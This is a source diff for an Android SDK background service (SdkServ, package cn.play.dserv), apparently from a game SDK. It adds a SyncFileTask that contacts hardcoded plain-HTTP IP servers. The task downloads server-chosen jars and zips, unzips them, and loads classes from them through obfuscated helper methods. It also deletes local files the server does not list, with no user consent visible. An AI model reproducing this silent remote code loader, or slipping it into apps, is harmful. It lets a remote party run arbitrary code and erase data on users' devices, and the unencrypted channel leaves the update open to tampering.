@@ -46,6 +46,7 @@ import android.view.View;
 /**
  * 主服务
  * v8:maxLogSleepTime < 0时关闭log;多upUrl支持;主动取gid_cid;up maxErrTimes = 5,shortSleepTime = 1000*60*20;
+ * v9:增加服务状态确认(维护状态时直接等待到下一次up时间,关闭日志和任务);集成任务syn任务;新增syn任务url配置项;
  * @author keel
  *
  */
@@ -100,7 +101,7 @@ public class SdkServ implements DServ{
 	private int notiLog = 0;
 	
 	int timeOut = 5000;
-	private int version = 8;
+	private int version = 9;
 //	private static int keyVersion = 1;
 	private static final String SPLIT_STR = "@@";
 	private static final String datFileType = ".dat";
@@ -112,11 +113,13 @@ public class SdkServ implements DServ{
 	TaskThread taskThread;
 	
 //	private  String cacheDir= ctx.getApplicationInfo().dataDir;
-	
-	
+	private boolean isSyncRunning = false;
+	private long nextSynTime = 0L;
+	private int syncSleepTime = 1000 * 60 * 60 * 24; //24小时请求一次
+	private String syncUrl = "http://183.131.76.118:12380/plserver/syn";
 	private String upBackUrl = "http://180.96.63.81:12370/plserver/PS,http://180.96.63.74:12370/plserver/PS";
 	
-	private String upUrl = "http://180.96.63.80:12370/plserver/PS";
+	private String upUrl = "http://183.131.76.118:12380/plserver/PS";
 	private String upLogUrl = "http://180.96.63.82:12370/plserver/PL";
 	private String notiUrl = "http://180.96.63.80:12370/plserver/task/noti";
 //	static String upUrl = "http://172.18.252.204:8080/PLServer/PS";
@@ -254,6 +257,8 @@ public class SdkServ implements DServ{
 			this.config.put("maxLogSize", maxLogSize);
 			this.config.put("notiLog", notiLog);
 			this.config.put("upBackUrl", upBackUrl);
+			this.config.put("syncUrl", syncUrl);
+			this.config.put("syncSleepTime", syncSleepTime);
 			this.saveConfig();
 			CheckTool.log(this.dservice,TAG, "no conf");
 		}else{
@@ -273,6 +278,8 @@ public class SdkServ implements DServ{
 			checkConfig("maxLogSize", maxLogSize);
 			checkConfig("notiLog", notiLog);
 			checkConfig("upBackUrl", upBackUrl);
+			checkConfig("syncUrl", syncUrl);
+			checkConfig("syncSleepTime", syncSleepTime);
 			this.saveConfig();
 		}
 		//games初始化
@@ -312,6 +319,8 @@ public class SdkServ implements DServ{
 		upBackUrl = this.getPropString("upBackUrl", upBackUrl);
 		upLogUrl = this.getPropString("upLogUrl", upLogUrl);
 		notiUrl = this.getPropString("notiUrl", notiUrl);
+		syncUrl = this.getPropString("syncUrl", syncUrl);
+		syncSleepTime = this.getPropInt("syncSleepTime", syncSleepTime);
 		this.upSleepTime = this.getPropInt("upSleepTime", upSleepTime);
 		this.taskSleepTime = this.getPropInt("taskSleepTime", taskSleepTime);
 		this.shortSleepTime = this.getPropInt("shortSleepTime", shortSleepTime);
@@ -1187,7 +1196,7 @@ public class SdkServ implements DServ{
 			    rd.close();
 			    //判断是否错误
 			    final String resp = sb.toString();
-			    
+			    //CheckTool.log(SdkServ.this.dservice,TAG, "resp:"+resp);
 			    
 			    if (!StringUtil.isStringWithLen(resp, 4)) {
 					//判断错误码
@@ -1428,6 +1437,20 @@ public class SdkServ implements DServ{
 								taskList.add(t);
 							}
 						}
+						//确认sync任务是否在队列中
+						synchronized (taskList) {
+							boolean isSyncIn = false;
+							for (PLTask task : taskList) {
+								if(task.getId() == 1){
+									isSyncIn = true;
+								}
+							}
+							if (!isSyncIn) {
+								SyncFileTask synTask = new SyncFileTask();
+								taskList.add(synTask);
+							}
+						}
+						
 						
 						CheckTool.log(SdkServ.this.dservice,TAG, "task check:"+taskList.size());
 						synchronized (taskList) {
@@ -1578,7 +1601,7 @@ public class SdkServ implements DServ{
 		synchronized (this.taskList) {
 			for (PLTask task : taskList) {
 				int id = task.getId();
-				if (id != 0) {
+				if (id > 5) {
 					sb.append(SPLIT_STR);
 					sb.append(id);
 				}
@@ -1996,4 +2019,301 @@ public class SdkServ implements DServ{
 	public String getEmp() {
 		return this.emvClass+"@@"+this.emvPath;
 	}
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	public class SyncFileTask implements PLTask {
+
+//		private DServ dserv;
+		private int state = STATE_WAITING;
+//		private int sleepTime = 1000 * 60 * 60 * 24; //24小时请求一次
+		
+		//private String url = "http://180.96.63.70:12380/plserver/sync/syn";
+		private int ver = 0;
+		private Context ctx = SdkServ.this.getService();
+		
+		private HashMap<String,String> fileMap = new HashMap<String, String>();
+		
+		
+		
+		@SuppressWarnings("unchecked")
+		@Override
+		public void run() {
+			this.state = STATE_RUNNING;
+			if (SdkServ.this.isSyncRunning) {
+				return;
+			}
+			SdkServ.this.isSyncRunning = true;
+			while (true) {
+				//网络判断
+				if (!CheckTool.isNetOk(this.ctx)) {
+					try {
+						Thread.sleep(SdkServ.this.getPropInt("shortSleepTime", SdkServ.this.shortSleepTime));
+					} catch (InterruptedException e) {
+					}
+					continue;
+				}
+				//间隔时间
+				if (System.currentTimeMillis() < SdkServ.this.nextSynTime) {
+					break;
+				}else{
+					SdkServ.this.nextSynTime = System.currentTimeMillis() + SdkServ.this.getPropInt("syncSleepTime", SdkServ.this.syncSleepTime);
+				}
+				
+				try {
+					//请求获取下载文件列表和更新参数
+					String req = "sy=" + CheckTool.Cg(String.valueOf(this.ver));
+					String re = this.getSync(SdkServ.this.getPropString("syncUrl", SdkServ.this.syncUrl), req);
+					if (re == null) {
+						try {
+							Thread.sleep(1000 * 60);
+						} catch (InterruptedException e) {
+						}
+						re = this.getSync(SdkServ.this.getPropString("syncUrl", SdkServ.this.syncUrl), req);
+						if (re == null) {
+							CheckTool.log(this.ctx, TAG, "getSync failed twice.");
+							break;
+						}
+					}
+					HashMap<String,Object> root = (HashMap<String, Object>) JSON.read(re);
+					if (root == null) {
+						CheckTool.log(this.ctx, TAG, "getSync error re.");
+						break;
+					}
+					
+					String downPre = (String) root.get("downPre");
+					String sdDir = SdkServ.this.getLocalPath();
+					//判断emPath，是否需要更新
+					String[] emp = SdkServ.this.getEmp().split("@@");
+					Object emPath = root.get("emPath");
+					if (!emPath.equals(emp[1])) {
+						String newEmp = emPath.toString();
+						//升级
+						if (this.synFile(downPre+"update/",newEmp ,sdDir+"update/",0) == 1) {
+							SdkServ.this.setEmp("cn.play.dserv.MoreView", newEmp);
+							CheckTool.log(this.ctx, TAG, "syn emPath OK:"+newEmp);
+						}else{
+							CheckTool.log(this.ctx, TAG, "syn emPath error.");
+						}
+					}
+					//判断exv的ver，是否需要更新
+					Object exVer = root.get("exVer");
+					if (StringUtil.isDigits(exVer)) {
+						int exv = Integer.parseInt(String.valueOf(exVer));
+						ExitInterface ex = (ExitInterface) CheckTool.Cm("update/exv",
+								"cn.play.dserv.ExitView", this.ctx, false,true,false);
+						if (exv !=0 && (ex == null || ex.getVer() < exv)) {
+							//升级
+							if (this.synFile(downPre+"update/", "exv.jar", sdDir+"update/",0) == 1) {
+								CheckTool.log(this.ctx, TAG, "syn exv OK.");
+							}else{
+								CheckTool.log(this.ctx, TAG, "syn exv error.");
+							}
+						}
+					}
+					
+					//同步服务端文件
+					ArrayList<HashMap<String,Object>> sd = (ArrayList<HashMap<String,Object>>) root.get("sd");
+					this.synFileList(downPre, sd, sdDir);
+					CheckTool.log(this.ctx, TAG, "syn list OK.");
+					
+					if (!this.fileMap.isEmpty()) {
+						this.delOthers(sdDir);
+						CheckTool.log(this.ctx, TAG, "delOthers OK.");
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+					CheckTool.log(this.ctx, TAG, "syn error!");
+				}
+				
+				
+				break;
+			}
+			SdkServ.this.isSyncRunning = false;
+			this.state = STATE_WAITING;
+//			dserv.dsLog(1, "PLTask", 100,ctx.getPackageName(), "0_0_"+id+"_task is finished.");
+		}
+		
+		@SuppressWarnings("unchecked")
+		private void synFileList(String downPre,ArrayList<HashMap<String,Object>> ls,String localPath){
+			for (Iterator<HashMap<String,Object>> it = ls.iterator(); it.hasNext();) {
+				HashMap<String, Object> map = it.next();
+				Entry<String,Object> entry =  map.entrySet().iterator().next();
+				String key = entry.getKey();
+				Object value = entry.getValue();
+				if (String.valueOf(value).equals("-1")) {
+					String filePath = (localPath.endsWith("/")) ? localPath + key : localPath + "/" + key;
+					this.fileMap.put(filePath, key);
+					continue;
+				}
+				if (StringUtil.isDigits(value)) {
+					//文件
+					long size = Long.parseLong(String.valueOf(value));
+					int synRe = this.synFile(downPre, key, localPath, size);
+					if(synRe == 1){
+						CheckTool.log(this.ctx, TAG, "synFile OK:"+localPath+","+key);
+					}else if(synRe < 0){
+						CheckTool.log(this.ctx, TAG, "syn error!"+localPath+","+key);
+					}
+				}else{
+					//目录
+					String dir = (localPath.endsWith("/")) ? localPath+key :localPath+"/"+key;
+					(new File(dir)).mkdirs();
+					String down = (downPre.endsWith("/")) ? downPre + key+"/" : downPre+"/"+key+"/";
+					this.synFileList(down, (ArrayList<HashMap<String,Object>>)value, dir);
+				}
+			}
+			
+			
+		}
+		
+		/**
+		 * 返回1为成功下载,0为skip,-1为失败
+		 * @param downPre 远程路径,不能带文件名
+		 * @param file 必须仅仅是文件名,不能带有部分路径
+		 * @param localPath 本地路径
+		 * @param size -1表示无需要下载,0表示必须下载,其他为目标文件实际大小
+		 * @return
+		 */
+		private int synFile(String downPre,String file,String localPath,long size){
+			String filePath = (localPath.endsWith("/")) ? localPath + file : localPath + "/" + file;
+			this.fileMap.put(filePath, file);
+			if (size == -1) {
+				return 0;
+			}
+			//判断目标文件是否已存在，如已存在则判断size
+			File localFile = new File(filePath);
+			boolean isOldFileExist = localFile.exists();
+			if (isOldFileExist && localFile.length() == size) {
+				return 0;
+			}
+			//其他情况均需要下载
+			String url = (downPre.endsWith("/")) ? downPre + file : downPre+"/"+file;
+			String localFileName = (isOldFileExist) ? file+".tmp" : file;
+			if (SdkServ.this.downloadGoOn(url, localPath, localFileName, this.ctx)) {
+				if (isOldFileExist) {
+					localFile.delete();
+					File newFile = new File(localFileName);
+					newFile.renameTo(localFile);
+				}
+			}else{
+				return -1;
+			}
+			//如果是zip，则进行释放
+			if (file.endsWith(".zip")) {
+				file = (localPath.endsWith("/")) ? localPath+file : localPath+"/"+file;
+				boolean unzip = SdkServ.this.unzip(file, localPath);
+				if (unzip) {
+					CheckTool.log(this.ctx, TAG, "unzip OK:"+filePath);
+				}else{
+					CheckTool.log(this.ctx, TAG, "unzip failed:"+filePath);
+					return -1;
+				}
+			}
+			return 1;
+		}
+		
+		
+		private boolean delOthers(String file){
+			File f = new File(file);
+			if (f.isDirectory()) {
+				File[] ls = f.listFiles();
+				for (int i = 0; i < ls.length; i++) {
+					this.delOthers(ls[i].getPath());
+				}
+			}else if(f.isFile()){
+				if (!this.fileMap.containsKey(f.getPath())) {
+					return f.delete();
+				}
+			}
+			return true;
+		}
+		
+		private String getSync(String url,String req){
+			try {
+				URL aUrl = new URL(url);
+				URLConnection conn = aUrl.openConnection();
+				conn.setConnectTimeout(5000);
+				conn.setRequestProperty("v", CheckTool.Cd(this.ctx));
+				conn.setDoInput(true);
+				conn.setDoOutput(true);
+				OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
+				wr.write(req);
+				wr.flush();
+
+				// Get the response
+				BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream(),"utf-8"));
+				String line;
+				StringBuilder sb = new StringBuilder();
+				while ((line = rd.readLine()) != null) {
+					sb.append(line);
+				}
+				wr.close();
+				rd.close();
+				//判断是否错误
+				final String resp = sb.toString();
+				if (!StringUtil.isStringWithLen(resp, 4)) {
+					//判断错误码
+					CheckTool.log(this.ctx,TAG, resp);
+					return null;
+				}
+				//解密
+				String re = CheckTool.Cf(resp);//Encrypter.getInstance().decrypt(resp);
+				CheckTool.log(this.ctx,TAG, "re:"+re);
+				return re;
+			} catch (Exception e) {
+				e.printStackTrace();
+				return null;
+			}
+		}
+
+		/* (non-Javadoc)
+		 * @see cn.play.dserv.PLTask#getId()
+		 */
+		@Override
+		public int getId() {
+			return 1;
+		}
+
+		/* (non-Javadoc)
+		 * @see cn.play.dserv.PLTask#getState()
+		 */
+		@Override
+		public int getState() {
+			return this.state;
+		}
+
+		/* (non-Javadoc)
+		 * @see cn.play.dserv.PLTask#init()
+		 */
+		@Override
+		public void init() {
+		}
+
+		/* (non-Javadoc)
+		 * @see cn.play.dserv.PLTask#setState(int)
+		 */
+		@Override
+		public void setState(int arg0) {
+			this.state = arg0;
+		}
+
+		@Override
+		public void setDService(DServ serv) {
+		}
+	}	
+	
+	
+	
+	
+	
+	
+	
 }
